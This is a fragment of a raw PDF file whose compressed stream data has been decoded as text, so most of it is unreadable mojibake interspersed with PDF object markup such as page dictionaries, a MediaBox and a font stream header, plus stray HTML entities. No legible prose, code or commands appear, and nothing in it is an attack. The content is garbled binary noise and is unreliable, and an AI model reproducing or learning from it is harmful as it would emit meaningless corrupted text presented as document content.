√Älf ‚Äú√•∆í;√õ√è¬Ø≈ì¬π|'√úJZ√ì=‚Ç¨YxX√û√ª∆í¬¥1'X$ÔøΩÔøΩ≈∏ÔøΩA√π¬§√Ñ!√çBM-F√≠^√Å¬©e}/
endstream
endobj
20 0 obj
&lt;&lt; /Contents 21 0 R /MediaBox [ 0 0 612 792 ] /Parent 37 0 R /Resources 31 0 R /Type /Page &gt;&gt;
endobj
21 0 obj
&lt;&lt; /Filter /FlateDecode /Length 2327 &gt;&gt;
stream
x√ö‚Ä¶XKÔøΩ√£¬∏¬æ√è¬Ø0√¶¬≤2√êV$R√è\‚Äöd7‚Äπ√Ö 	‚Äör√à√§@Kl‚Ä∫=Q√™^#&gt;√µ¬¢√õ-√∂bR|U¬±X√µ√ïWN6‚Ä°M¬≤√π√ã¬ß√§w√ö//≈∏√æ√∞S≈°o√í2Vi≈æm^^7*S¬±¬™√≥M‚Äò√¶¬±¬Æ√ï√¶¬•√ù√º+√∫√ß√ë√å√õÔøΩNT√§&lt;¬∑fÔøΩ√∂`‚Ä°¬≠*¬¢√πO√õ¬ø√º‚Ä°‚Ä∫4ÔøΩ√´<wxx≈°√Öi¬π√ô¬©*¬Æ√™‚ÄùÔøΩz[a√ã√èfz√¶¬≠*¬£√≥2p∆í?p.≈ì¬≥q:√é`√ázÔøΩj√û√π√ã2x√û¬©‚Ä¢¬∞¬∏js√áu¬° ¬∂ku¬ßy¬∂√ô√©"¬Æ="" q√Ω√•h'√ò¬¶t¬Ωou√è‚Ä†‚Ä∫‚Äú9a¬ß≈†√¨$√ü√ã¬æs√õ4‚Äöuit‚Äû≈Ω√Ön‚Äπ‚Äúu√§‚Äì¬™√≤+¬±¬©√é√¢n‚Ñ¢¬∞<√ª√ï¬Ω√ög√•√†"u‚Äô‚Ä°eÔøΩ√±3√ã;¬£n√ñÀÜ√¥√ô√çÔøΩmw‚Äû:¬Æ¬µ√õ¬øÔøΩ√å¬ø]7√∫√±tt√ç6o#√ì√Å="" ‚Ä¶≈†√∂¬®<√ù¬±√†√á√Çv="">‚ÄôFh√é2N¬´LEo√Ñ¬ßÔøΩlV
{q¬£Vl&nbsp;√∑‚Ä†1√ü8;ÔøΩY√Ñ√í‚Ä†a≈ìy¬©y]√ª√π√±√Çi¬Æb
^ *√á√õ]¬¶¬æ¬®T‚ÄòY√¶√£8y√πÀú‚Äπ≈í¬≥d√¨:√Æ¬∞
2?√ô√ø.n¬≤≈æ√Ø‚Äû√ú√ú√ß√¥a¬¥JV‚Äö‚Äô√û/√Ωiv√£√†≈∏¬∂¬ª&lt;¬©¬£=¬∏M√π¬±¬∑√ú_¬±√ïh¬≠^¬∂M2√ï√ö√é√≠√ÖO√ål¬ª3√õ_M√Øx0^=√ê√ã√ÅÔøΩo√îi√∞‚Ä¶ÔøΩ¬£¬∑√É√ö ÔøΩ√ûA?&lt;7M¬£d¬°¬≤T‚Ä∞0l√Ü√æ√îY‚Äò&gt;]√£f0aQV`B√ßyag√¶√Ω5&nbsp;√ña≈ì√é√°ÀÜ√Å∆í/-¬≥*¬®T¬¨ZHk~√ªÀú√ñB√å√ñD√ówx√Üh¬ØB¬¥W¬æ}¬•*hO.nvo√§√óx\hNe%8z√ß‚Ä†/¬¶√Ä√¢
n√Ü√¶√å√£ÔøΩÀÜÀúH5√ò&lt;∆íGÔøΩr√é4¬ªoI≈°5≈Ω'/"m√ó¬πzI,≈Ω¬±r‚Ä∞/√∏√§¬∫N#G¬≠_;√ãÀú√ßv√ÇÀÜ√°E¬ΩÔøΩ√ç	\‚Ä¢√ø√á√ç√å&nbsp;‚Äö√≥‚Ä†;p‚Ä¢Q√∂‚ÄòÔøΩ√äh‚Äì√ùp√ô√É;¬∏√è‚Ç¨{L^v6√â‚ÄöF@√∞√é‚Äò√Ü¬Ω¬∑√ì‚Ä∫¬¨S‚Ä¶&amp;‚Ä°¬£NoÔøΩ_&amp;‚Äπ1¬¶RqZ√¶j:√ã √∞√Æ(&nbsp;x√π√ê√†√®√≠√ì¬∏≈Ω√°C√üy√é¬°‚Ä°√ú¬π‚Äú(&amp;h^~GW≈∏‚Ä¶ √Ñ√∞B√†d√§√©q‚Ñ¢¬∏3√ù√∞ÔøΩ=¬¶√ç≈æ≈ìc¬§√∑√Å√•GA`√º√∂ÔøΩo√≤(¬¢√ä¬∏Dc7E√ìC‚Äû√ç√æÔøΩP√ß*√ñ‚Äî¬•√§7gT¬µ(√≤√®2ÔøΩBFh¬¨¬∏¬±√ß√§√¶0√è√∫√¶¬¶q√®√•¬≠y√¢√ù√çG√ÆQ√∫¬∞∆í'ÀÜ√Éz+√™485√ã√∞√Ç¬≤F9‚Ñ¢}D¬ª5{¬π‚Ä°¬™LD.√∂,D‚Ä°¬∂√ç√å√êZ√î≈ì`u¬ß6D09‚Äπ≈Ω~^√∫‚Ä°)√ô√≤`‚Ä†ap6h√´&amp;‚Äò√ãy√ëUA≈ìBB∆í√Æ≈†√™l‚Ä†4c√§√ÉnÔøΩ√ì√Å.√´¬¥√∫X`≈°‚Ñ¢¬ß√Ö¬®i√§√°√†‚Äù‚Ä†¬¥√å¬ª√™¬®¬≥‚Ä°p@nt¬º?√¨J√É√∏H√ó≈æy√¨ÔøΩ"√®w‚Ä°‚Äù√èÀÜ¬ßX\\√¢‚Ä∞G¬ÆÔøΩ?√ó\√á√ü≈ì√°NczH≈æR@√ç≈†ei‚Ä∞¬∑‚Äù‚Ä¢|M√¨¬π0√îÔøΩ√∏≈Ω√ªu4√±√£+ÔøΩ√•;‚Äò¬•‚Ä∞√ä≈°ÔøΩ¬Ø‚Ç¨¬∫^W√á√ô@√òifs∆íD‚Ç¨√ì‚Äò√∂¬µVV√≠ÔøΩ≈ì√ß!√Ç‚Ä°¬©¬¶+N√™¬∏∆í‚Äù¬ß‚Äì¬øÔøΩ¬•‚Ç¨0√ø‚Ñ¢7cp√è √ù+/u¬´¬∏√¢!‚ÄòÔøΩh√†‚Ñ¢¬Ø‚Äû√Ä	r‚Ñ¢@A[t√∂lpÀú√ñqDG‚Äôd¬¶WÀÜ‚Ç¨qpD¬¢Y√¥¬∑√â√ú`fv<n√ªp≈æ√•√éw≈ì√¶√Æ√Ñ√∑≈†√≥√à√ÑtÔøΩ√Üeq¬°{√¶√∞5u\‚Äù¬™‚Ä°¬ÆÀút‚Äû¬π(ÔøΩ¬≤‚Äún√íxgw¬¥√ç‚Ä¶@¬©rr√æ√èoyhr√™√Ä√ß+‚Ä¢3‚Ä†{≈æ¬°ÔøΩ√ú√∞ad;√Ø√áÔøΩ¬≥√º√ßÀú¬Ω√ß¬Ø√£,√ì¬∞a=#"nÔøΩc√Ç√πs √â|√µ‚Ä∞√é~¬∂¬Ω@¬µ?≈Ωk√ó2√Ç3?db√Å]√≤∆íwÔøΩz√®u√π="" ÔøΩ√≥√õ√ú∆í¬º+kÔøΩm="" ¬≥¬∏¬Ωav√§‚Äπ)ÔøΩ≈Ωo<="" ¬®√ê≈æ‚Äπ="" √™√èa√≥m¬ºj√äh√ò¬∂¬∂}¬∏¬£√Ä¬∫y@0d√í="¬∑¬±UJ5√ë√ä#~‚Ä¶v‚ÄûL√∂√ïN+W√ã¬π5Q√¥L√®¬Æ¬∏X¬©√£D]Àú√≥D√§√ª√Ñ" ¬∞√à√ôÔøΩ√É?x]="">‚Ä¢WW|¬ªO~fi'bKg&amp;√æ≈æ√†&lt;&lt;‚Äπ,√Ç√ß‚Äò6√ü‚Äô&lt;√©√úwA{√í‚Äú‚Ä∫√ñ√ö√∑¬ª√¨√§¬≤P√∏√®√™.51√£√éaY‚Ç¨)ÀÜ¬£√©;¬≤√Æ4‚Ä∞0ÀÜ‚Äò*3√Ña≈æ≈ì¬ß¬•‚Ñ¢√Å√Ø@r√äC-P√ü	i¬µ√ß¬µ√º‚ÄûÀú9√É√æ ‚Ä∫s2{ÔøΩ√°,BQU√°≈æ¬±√¶¬∞@√≤√Å√ì
∆íK√âÔøΩ¬≠K√í¬ØB√ØePÔøΩA(V≈†&gt;¬¨Àú√´√ã√µ√∏,√ù√£‚Ä∫h√ó√µ¬•l{¬¥:%-‚Ç¨¬©[√é{¬•Q3‚Ä†‚Ä∫√¶!)‚Ä°≈æB‚Äù√Ñ¬™√äW¬≤¬¨+FB&lt;√¨r98v√òÔøΩ‚Ä¶y√£√Ä¬£¬™≈í¬æ√ã¬∫Q6
G‚Ä°¬∫Khz‚Ä¢¬Æ¬™√ù‚ÄîdD√Ñ≈°{√°8‚Äú√à¬∑0¬ª√¥¬∂¬ΩZy¬®‚Äú‚Ç¨p¬ªP√©WÀÜ‚ÄùJ¬§√Ä7√¶√§¬ºÀÜ√æc)w√°H3B&nbsp;√π@¬©Z¬æ{!WÔøΩ√∂t√§`
¬§v√≠!√ï √ª¬¥&nbsp;‚Äî√à!P&gt;¬≠√ì_<u√±\c√ñ√¨oppr¬Æq≈†-ÔøΩs!=5‚ÄùoÀú√Å4√® o√óc√π√é√∞$‚Ä¶5√•f‚Ä¶^i="ÔøΩ¬∂,‚Ä¢‚ÄûG¬∑T¬æ√ßun√Ä¬™DPn‚Ä¶√ãÔøΩOA¬≤¬•" √∫√®√í√†¬´u√µ;¬®∆í√í√¶g7¬Øt¬¨√´,l}s√∂√Ω#√ì¬¶√°="¬ø'‚Äùnw√à‚ÄûkT√ë?X√Øo‚Ä∞√í√õ¬¨T‚Äò≈†?[√üÔøΩt¬∫‚Äö√∞‚ÄùY≈†`√±$√∏,E7√ú¬¥ÀÜUY√ú">√ç‚ÄöuN√ßh√øG√Ω‚Äò‚Äò≈†al√†√∂R¬∂‚Ä¶?n3‚Äô√íq√∏‚Äπ√ø√É¬®√≤¬ª√öS√™≈ì¬∏J6√∏	Y√ì(~$ÔøΩ6‚Äú√ÉA‚Ä°¬≥√é√Ä¬≥-S√´√π‚Äú¬≤(.
¬Æ√Ø:‚Äòp‚Ñ¢w√°@√º√ª‚Äö√Æ1t¬∞z √ê√ò√ΩvA√ºQD√®¬≤≈í¬Æ√∂L&lt;2¬ª√û@!¬©[√±Àú¬™ÀÜ‚Äú√¥√≤‚Äî‚Äì¬•?‚Ä†¬¶√Är√Æ‚Ç¨0‚Äπ√ã\_%¬ßÔøΩ√ΩE*¬Æ"ÔøΩ¬∫¬≤|.‚Äû≈íF√ªNj"#≈†r&lt;√Å√ë5√†O,√ßy√º√ï√ç/√∫√±J6‚Ä†J√¢¬≤√êw√ø√ì≈í‚Äö√Å√ÅT≈æ¬ªp&amp;√ê‚ÄôS‚Ä∞√ò*d√∫√ª≈Ω√æ4‚Ç¨UHJ¬§l√íW^‚Ç¨ÀÜ¬∞ √π¬§‚ÄπW√ëO¬°Dhq√∑¬Ø√ø√Ø!u√´√®¬π)_¬Ø√û¬£3ÔøΩ]‚Äπh'¬æ√ã√ÖÔøΩ√Ü√ø¬©√êE¬¨p0√ì4√£ryb¬≠YX√∂√Ö√¨√∑√†¬£?H<c\≈∏√ßÔøΩ√ø‚Äö~‚Ç¨,k√©√û\o√ß"c√º#√™s√πy‚Äúu¬¨hc√Ñi%√ò¬¶7k~|√π√¥zw√æ√πendstream endobj="" 22="" 0="" obj="" <<="" filter="" flatedecode="" length1="" 1527="" length2="" 7958="" length3="" length="" 8982="">&gt;
stream
x√öÔøΩ¬∑4≈ìk6¬¨‚Äπ√û{0zgF'j¬Ω√ó√®∆í√Å(∆í1z‚Ä∞√û¬¢‚Äπ√û‚Ä∞D√Ø%ÀÜ√Æ√ë{%DD¬Ø&gt;√â9√Ø9√Øy√ø¬≠√Ø[¬≥√ñ√ås√≠}√≠}√Ø¬Ω√Øk?k
∆í‚Äì.ÔøΩ¬¨ÔøΩ‚Äπ√§‚Ñ¢√Å√¢≈†√§√îu@√º P‚Ç¨√§√áfa√ë∆í"≈ì ‚Ñ¢¬±Y pw¬®L√º¬ørp√±`‚Äú#x√™.0‚Ç¨≈†‚Ä°$	‚Äπ∆íD√ÑÔøΩ@?(√∂¬¢\ √∂‚Äû√ö√îy*.0ÀÜ;6‚Äπ≈ì‚Äπ¬´jgÔøΩx8√¶?ÔøΩvkHLL‚Äû√ªw8@√ñ‚Ä°Z∆íau0√Ç√¢√ºp¬¢5√ò	&nbsp;√´b
‚Ä¶ |√æ‚Ä¢‚Äö]√ÇÔøΩp√ß√£√≥√≤√≤√¢;¬ª√≥¬∫√Ä√≠¬§8¬∏^P‚Äû=@√¢ÔøΩ{Bl¬øh‚Ç¨ÔøΩ!v√Ü‚Äπ√ç√ê¬≥‚Ä°¬∫√øi√óu¬±ExÔøΩ√°√Ä∆í√Å	j
ÔøΩ¬π?Dx√Äl p√Ä√É√°]e5‚Ç¨¬¶+√∂'Y√≠O7√†¬Ø√ô@¬º&nbsp;¬ø√ì√Ω√Ω+√∂;lm√≠√¢√¨
‚Ä†√π@av[¬®&nbsp;√πLÔøΩ√°ÔøΩ√†‚Ç¨a6¬øÀÜ`'w‚Äî‚Ä°x¬∞'√™¬∂z √º¬Æx&amp;¬´
?4√∏W{√Æ√ñp¬®+√ÇÔøΩ√ó√™√¥¬´E¬æ_i¬¶¬¨¬≥‚Äòsqv‚Ä†√Ä√Æ√ò¬ø√™‚Äú‚Ä°√Ç!√ñc√∑√°√ª√≥fa.^0¬ø¬ø‚Ç¨-fc√ª¬´	W&gt;}√î√ç¬¢,√ø√•√Å‚Äû√ΩÔøΩ√ç‚ÄöÔøΩ@1A√Ñ
√±¬∂¬∂√ß√ª‚Ä¢^√è√á√≤√õ	√∫e~√® √Ä√è√ï√Ö`√ª√ê$jy√∏√Å√∂s{B¬∏$√Ä√Ø¬ø√øF√ò √ÄjÔøΩXA√¨&nbsp;0√¨¬≤?Àú!¬∂√¢‚Ä°√ã‚Ä°C¬Ω&amp;√Ä√≠ÔøΩ√Ä_≈∏¬ø≈∏√å√§e√£s√≤√π‚Ä°√æ√ª~√π≈íu‚Äù√§ÔøΩ¬π√æ√¨√∏o√ü√ì¬ß.√û?A¬ø &amp;*
√æÔøΩE√Ω¬´
√†?¬°√ä0[‚Ç¨√ò≈∏√Ö&gt;L√©?{√æu√ø√¨√≠√†√ü¬π4\D¬∞√ø¬£qS&nbsp;√ê√∫√°√¥√ø¬¨√¥√ü!√ø√ø‚Ä¢√•√ø¬¶√±√ø-√®‚Ñ¢‚Ä°‚Äú√ìo7√ªo√ø√ø√á
v‚Ä†:√π√ºEx√ê¬¨√¢A√ø√™.[√ª_¬™!√§√èÔøΩU‚Ä°√ò@=≈ì√ø√ó¬´≈í?√¨ÔøΩ,√å√é√©√Ø1B√ù≈∏A¬Ω!6ZP‚Äû¬µ√Ω≈∏b√π√ì¬Æ√øk√â≈ì&nbsp;0ÀÜ‚Äì‚Äπ;√¥√ó[√Ä√ø√á√∑¬∞Y√ñ≈Ωo√∑E√ævA√ß√üG*√Ä¬¨]l~m¬øÔøΩ0‚Ä°∆í}¬∞ÔøΩB√¢√∏ÔøΩV√ë√¢√Ω[√É&gt;^Àú√¢!√∞√ê^√Ä√ñ≈Ω√Ω√´F‚Ä¶‚Ä¶|¬≤¬øL¬ø‚Äò?‚Ç¨O√©$√†S√π‚Ä∞‚Ä∞√∏√Ä#√ê∆í√π √ø@√Ä√ª/√∏
√ø/(√†C√º
z√°Cx¬π√º‚Äî√ª!¬µ√á?ÔøΩ√ø!¬µ√è√üPP√Ä√ßÔøΩ√øI√øW√Ø√ñp√∏√É√∂√øV√ß√É`√æ∆í¬øj oÀÜ5√∂√¢≈ì‚Äπ√µ‚Äú0‚Ä°√∫¬∞√é¬´ZY/≈æ√≠‚Äô√ì,√õ‚Ä†&lt;~‚Äπ√∞.ÔøΩ|√åT≈Ω≈°≈ìÔøΩ5√∏‚Ä¶l√™√à{√Ç‚Ä¢M√∂s‚Ñ¢%√∫≈∏~√ªmÔøΩÀú‚Äò√≠)√ö?√ºo-‚Äôt&amp;¬∑;¬∞&gt;‚ÄôN¬º√û‚Äîm&nbsp;√Öz√å¬£'¬≥√£√ø√ì√ç√ü √ò¬µ
¬π[‚Ä¶¬•√Ä√çC_¬´ÀÜ√§√ä¬´_√ë¬ªa&nbsp;by,bn[{¬ßFX√ß¬∂b≈†'N?√ñ4¬∏l‚Ä†¬•√ê*w‚Äì‚Äô√ÅC√ªÀÜ‚Äú√∏√à‚Ä∫`√¶√ºb≈°8√¢≈æ^%‚Ä∞;√†[≈ì@‚Ä∞≈∏√±:√º√µ¬¨√Øj‚Ä¢¬ø{3‚Ä¢1%-√™9√±√ò$¬´√ü√ì√ù4≈†y¬ø√≤‚Äô5√∏X√∫,y√ó√∏‚Ä†√≥+ÔøΩ√ì.¬ª√Ø¬∂‚Ä†√é|√Ø√Ñ≈ì‚Ä¢eB≈ìÔøΩ≈†‚Äô‚Ä¢T√πe√¨Z¬ªR¬≤sC2‚Ä†`√Æ√ë≈†√ä≈°¬∑√≤‚Ä∞H‚Ä∫‚Ä¢;¬∑f2√¥^√ìI¬§AHGl¬ª√∑&amp;¬ø√Åw‚ÄúÔøΩ¬¨√ûÀÜ3R√á≈æ,¬µÔøΩ√ñ'I‚Äπ≈ì√ü√Ä≈†U¬ºm7tG√±√ât√àzut‚Ä¢¬¥¬©U√üRÔøΩ¬∂¬≠+√®¬≥]N¬ΩW√∞√û¬™√É√à≈†√∑¬∞√≤√å¬±≈†√ØT‚Äù√ß√û&amp;¬ß√©√ë‚Ñ¢u¬∂√ã`√∑√é¬∏¬ªÔøΩ3‚Ä¢9r*KSSÀÜ√§nm{j¬æ&lt;√çK√≤‚Ä†\ZÔøΩ¬±6t√™8¬¶√î≈ì¬¨‚Äö6ÔøΩ&amp;-≈ì!¬≥√∫√≠}≈Ω√¨≈°√ù≈Ω/√¨¬´¬®ÔøΩ¬Ø‚Ä∫¬§√∫√∑¬≤5oDsÀÜ^c)a&amp;√Ñ_¬∑&nbsp;Dn≈í{ÔøΩ+~√ú‚Äî√øD¬π¬°√áQtj√∏√∂√Ω√©√∏¬ª√ìC¬≥b&nbsp;o‚Ä¶ÔøΩ√ÆS\
¬ßW$√Üy≈°‚Ä∞j‚Ä°√ì‚Ä¶√±B4√¶bÔøΩ}¬§w√¢e¬™√≠≈ì√®√æ√ü≈∏a‚Ä°‚Äû√ù√ª√µE‚Äì"∆í*√¶¬∏√ó¬®√≤~¬∏u¬¢PHu9√ç√ì¬Ω√∑√ì√™¬µ√Æ√ò≈í√∫√∂^√¨‚Ä¶GwB¬©pG≈æP√πÔøΩhÔøΩ#Z√ë6‚ÄπP√à¬•√Æ√´V\¬ø√êÔøΩ‚Äöu
j‚Äò‚Ä†√ÑK{&gt;U‚Ç¨Om‚Ç¨√∂√Ω√≥~/^H8c√å√≤{≈í√•¬ß√ùDÔøΩ‚Ä¶√õ	
¬¢‚Ä†¬§
"a_‚Ä°&gt;¬¶S¬±≈†
≈ì88ÔøΩ√°ÔøΩ√êÔøΩ¬§√Ñ¬∑√©¬ÆDQ√©C≈°¬£P¬£s√£|y√û√çB¬æ)√°√Ö*p&gt;5√óÔøΩ√∑,n≈Ω√ç#√å√°U√¨o√î‚Ä¶uz~ÔøΩL√Æ;ÔøΩ√Ω∆í7W√∑e≈†√∫=G√Ñ¬≤√ÑHK√¨w√è≈∏Z√ì√∂AL e&amp;M‚Äπm√∑√ï√ó√Ω√É√è.√≠<j√ª6√à¬≠√ñ‚Äì¬πw√∑)√â‚Ä¶g?√∞√≤ÔøΩ¬µ*9¬º√ôn6x√π‚Ä¶√Ω,]m√ß√¨ ¬¢).'n="" 1√£¬†h?√≠≈Ωi√ï+'l;40¬´n√±ÔøΩ√©√™¬§="" ¬≤√ä¬ß(¬º¬ß¬≤ÔøΩ="" √ü¬≠i\¬°¬•¬£¬™¬∏¬Ω‚Ñ¢{√©"+√Ø¬•¬µ3x√â¬≥q√∫ÔøΩ√ªg8√í√Ø^sqg;k√∑¬≥‚ÄòÀÜ="" o,(‚Äπ`ÔøΩe¬∑√ô√§sp&√©ÔøΩ‚Ç¨√Ö√á¬£¬≠y√ó\_'lv√ç≈æ√Æ¬•‚Äòn√°i%√õ‚Ä¢ÔøΩ}≈°ek√´'√ç¬∑z*,1√é√Ö√à¬≥‚Äûx√∑¬†¬©\¬°¬±√Øt√ê¬Ωkp√Ö{‚Äπwv&≈∏√®|‚Ñ¢¬∞√ö¬¨√π¬∏‚Ä°√òs√í¬ø!√≥e¬®0c‚Äπ‚Äûk√øÔøΩ√¶¬¥¬•_¬ª√≤o≈ì¬ΩÀúd="" r8s√¨√¨‚Äìa√Ø√Ä%‚Äö9f√∫√Æb‚Äìb≈†5="" ¬§√∫="">m¬™√§√Ö6√à√¶s√§}√à¬®≈í4√©√á√Ç√®¬®"√ç¬¢√ïÔøΩ√Æ‚Äú√º‚Ä∞√ÆsG)tN√¶√∫√™¬®U'_√ø¬≤√µ‚Äû‚Äûu√ò√ô^N‚Äô√Ç‚Äì√Ü¬≥≈æ√Ω¬¶^‚Äù$u¬°|/√´√ç9V√å¬º√Å¬∞bG¬Ø∆íJ¬©¬§‚Äπ√¥¬∏√≤‚Ä∞N¬Ø√íÔøΩ√æz√ê7i¬ß√í8√µ√Ö¬™I~;√ç√ùe^√íp¬Ω~‚Äò√ä‚Ä∫f¬Ø‚Ä∞‚Äù√ím¬®%rÔøΩ√ñ
√í¬¨HE√å?;f√ß¬Ω9WyReÔøΩ‚Ä°¬≠√ë√≥≈†√≥o1N√±qO√©√´√µE√ø√¨√§‚Ñ¢&gt;¬∫(√Ω√ó√∑√ñ√£√ïkE¬ª√∏#√•N3/6R‚Äû¬ß√¨¬≥‚Äû√ëM¬∞√∏√ó≈°&gt;√¶'√í√ë¬Ø{√™≈∏e}v√™√î√≤g√°0j√Öw&gt;j≈∏¬Ø√å¬•%&amp;‚Äìd√≠c¬©"?S‚Ä∞√Øs√è¬≥&nbsp;-¬´O√éD√∑‚Ä∞¬±H√≠√Ø¬ßR'√ú√üÀú7≈°√æ4=A√ÑA√π‚Äô3Àú"2h8∆í?ÔøΩ√∫gÀú4√∫¬∂≈í√∑&gt;CFDG√¶‚Ä∞√¨¬´ {√≤√£N^I√§√Ø‚Ç¨qz√ã¬º){6√ó¬™¬©M.√ØT√èq¬£‚Ç¨ÀÜz√©‚ÄîcD≈†sD√≤¬¥√¢√©!√¶√ç	M‚Ä¶√ì√π‚Ä∞≈ì¬¨m‚Äö√á¬Æ√∞√è√ûq¬∑BT¬∫‚Äös{‚ÄölG‚Ñ¢c]‚Äπ¬±√∏mz9'ss≈í¬±‚Ç¨¬•f71‚Ñ¢√∂√â5√à√Ω',‚Ñ¢¬∫≈Ω¬ªR√å‚Äö√ø/√µx≈†5¬©√ò≈°√ªV≈æ‚Äû¬£hf√ç‚Äú√î
‚Äò!%¬æ‚Äù√¢√ÅtÔøΩ%%√ä¬°wo¬ß∆í0√¶¬∂√µ‚Ä∫√à√¶¬π≈∏=√∂√ß\	ÔøΩ
C%¬©≈†√ìo¬ªF√£S‚Ä†j√®√¢~4a`}‚ÄπN‚Äô√∏x{‚Ç¨√π‚Ä¶√ø√¨¬•3≈†‚Äù^√ó‚Äûc√≠√Ü¬£=¬∏Gx√≠suXL‚Äπ√áCKijmQ√ö3/E;√ö&nbsp;¬ª'ÔøΩ86%¬≠+N¬£.X√£√îm√º?qS√¥7N√è=z‚Äû?g√à√ç¬Ωd¬°x¬Æw√é¬¶s;D√≠0‚Ä¶‚Äù√Ø2¬¢U¬Ø‚Ç¨¬®√ù%p!¬•ÀÜk√û5√±ÔøΩY^√ä‚Äû~‚Ñ¢√é≈∏≈Ω√ü&amp;C"lÔøΩo¬¨T√Å√Ü{≈†√ªrlÀú¬π√≤9x¬∂V‚Ä∞K6√©‚Ä¶ÔøΩ\Y√ª√ï¬©√Ñ¬ß'√©?&lt;√Ω%‚Äû1g¬∑dqnF¬±R#	¬Æ√äoYj√ô√©≈í√é<sgwd@ÔøΩb√àn‚Ä¢¬≤5¬™k√ïa√à√¥√Ç%dÔøΩ√í√í√årz ¬π¬≤n√ñ√´≈ì‚Äô√é,‚Äû√ân√ô√í¬®√∂?="" ¬¨x:r√™√°6¬≥w¬ø1√ã√´#√íy√†1√©ewx√ªmv‚Ä¶a√Ä]√Ç)[√¥u¬•x="" √ù√∏¬Æbx√Å¬Ωqc2√ñ¬π√ë√∫c√Ö1="" √Ø√≤¬µn√§√ª¬®√©‚Äú)√≠√Æh√ñ6≈°¬¥!√Ø√™√≠√Ω¬±6_x~wt‚Äû¬£\y¬≠¬≠‚Ä∫!√èb√™√èpa¬∑hl√é="" w.√û;'√£8ÔøΩ="‚Äö&amp;√°∆í¬¥‚Ç¨8" b√±x√ë‚Ä°‚Ä¢√¶y&∆í‚Äî√Ñ‚Ä¶√Ω!√æam√á3^√µi|?√ä7o¬≤dÔøΩ¬∞¬´√§ji√è~‚Äô√ß¬∏t√í7kh‚ÄûyÀú¬øe√øh‚Äù√Ä√±!√æ√ä√§jp9q‚Äπ="" ¬£="s¬®√•√ï√õJ√ÖA:ÔøΩ¬§√úe¬≠$≈†√ù≈æ√â√∑¬≠√àUt‚Ä∞√´‚Ä∫a4¬ßx{¬§C√∏≈°√Ñ;√í√üÀú√Å|‚Ç¨√†ÔøΩ‚Äîx√û¬∂n√™√ªH√î√π">'NPÔøΩ‚Ä†√è¬™Z√£√æu√¶¬™√™√≤{ÔøΩ√≠.¬¢√£‚Äú¬Ω¬∫√†JM√ª	√ô¬°√å¬¨‚Ä†N)√≥2b1√è√º√©DNL6egD√´t¬µ¬∏ÔøΩ√ìazH√±+¬µi≈°¬∞≈ΩwAC√∏¬≠
C‚Äî√≤¬´√¨QYM≈ì√á√Å√ù[b;¬∫√ï√≤6$≈Ω}√î√âV√å¬µ7√áC√¶ÀÜ4√Å{!H√í'%ÔøΩ(x¬ø√í[√•n√çLa¬∂√µ¬™ÔøΩ	"¬ß¬¢√∫ÀÜl√¨¬∞√ª
√ç¬Ø‚ÄùKL√û`$¬¨QM¬Ω¬ºG√õ&lt;√¨-*M-√Ü√Ø|≈í√ñ¬∞¬∫√ä√åj|√ßWd√¶y‚Ä∫∆í√û\‚Äú√°
D#M√∞$¬§√à¬´5
Y√Ä‚Ä¢¬∂√∑√û¬∫√ô‚Ä¶‚Äù√ï√∞√ë√Å¬ø‚Äù‚Ä¶√Æ√öÔøΩ√óh¬±¬§¬º√¥T√ô|√≠N√´√±.Àú‚Äò√Ωi¬Ω?ÔøΩ1√ö&gt;QXt√ª√úf‚Ä¢=≈íS&lt;√Ø√ä%√é√Ü2¬™¬®HV√ΩF√ã*,6‚Äö√∂:)r¬ØÔøΩ‚Äìl√Ü√îT=√®d√á:2
)OK¬∞‚Ä∫f%dC2√â¬©¬©‚Ç¨%‚ÄùÀÜW¬ß¬ØgC¬µ√™√§√ô-√ñAc√ÅÔøΩ|=C5√Ü√¨*‚ÄîÔøΩ5¬∏OK√à5√Ü√û¬™ÔøΩ5√õ¬π¬§√µ√É√†e¬≤¬¶k√°√®√ÇZ√é¬≤}¬∂√†30;¬æ¬ø&gt;¬®ZT¬®√™¬π,√ª√õ^rH%‚Ä°‚Äî¬∫‚Ä†√§√ï¬¥√§(LZ√Å5&gt;~√¨FTcZs√Ω‚Ä¢ÔøΩ√£√ÅE√öw¬™√èk¬∏≈°l√¶¬§√å¬≠?¬º$*"¬∏‚Ä°‚Äô‚ÄôPqTA/P!/≈°√¥
o¬ß√≥‚Ä¶`D¬•4P√ë¬ßBw≈ì;∆ía√©√û√´¬∞.√∫^‚Ä¶(√≤Z√∑R√≠fR√•√≥√•o√¶¬≠¬∞√Ö0√é√≥
)¬≤¬´√Ç"G¬¶√µj/√©^√ó¬æÔøΩ√Ü√ª√±‚Äù¬æ≈∏ÀÜ¬¶\r√ö√•&nbsp;s¬∫√ü^√ØWrk∆í‚Ä∫¬º√âÔøΩ2%sb√Ü¬µ√ê≈ì√î#¬∑L√†√õv#√≤C√õ√™|√ì¬Ø√ÆV=≈Ω}√å√ç:¬º¬¥GC_kJ=√∏6qe√´cH√≠im√•1‚Äú√äV=r√ìQ√è√©]√üq+¬≠+ÔøΩl@≈†√¥√Å(\‚Ä¶Àú(IU√ÑXM≈æ\≈ìzf¬ª¬£*,=√£‚Ç¨√®c√ßcÔøΩU√éS,√å_√Ç√Ñ@m≈ΩB¬£≈†√å√Ä‚Äú√•*¬¨¬ø\√•x√ß-8√ø!√ï√∏¬¢¬¶C¬¨{√õ¬∑O√πZ√©`3≈ì¬¢¬®√ëm¬§√°*ÔøΩ&amp;ÀÜ¬°√Ønf√µ√Ñ.	‚Ñ¢.≈ΩGM√ºK√¨%Y√ïR√µÀú+	x!√≠ÔøΩ√∏√¶GÔøΩ√∑√µ√ê¬´‚Äú√°-√ã$∆í≈æ√îcV‚Äù√º`√©fkBJ√º¬π+R\¬π√•√¥¬°L‚Äòz√ã¬°Ef¬¥≈°¬∑√™≈ækÀú_i¬ø‚Äô√ª7‚Äû¬≥¬∫√∑√á~√Ä¬≠6b√®¬∑c‚Äö√ôLD≈°¬§xm‚Ä¶√É√ò√Él√£√ì]f\√®/√ã,√Ç¬ø¬Ωr√°√á√ü‚ÄùX√≠¬®√ÄB‚Ä∞¬™{&lt;‚Äû√óK‚Ç¨B√©¬≠≈æ¬®√úm≈Ω√ùu√∂√ñ‚Äû√ôF^√Ø¬´√±√°5√ÆT≈∏C√ãzH
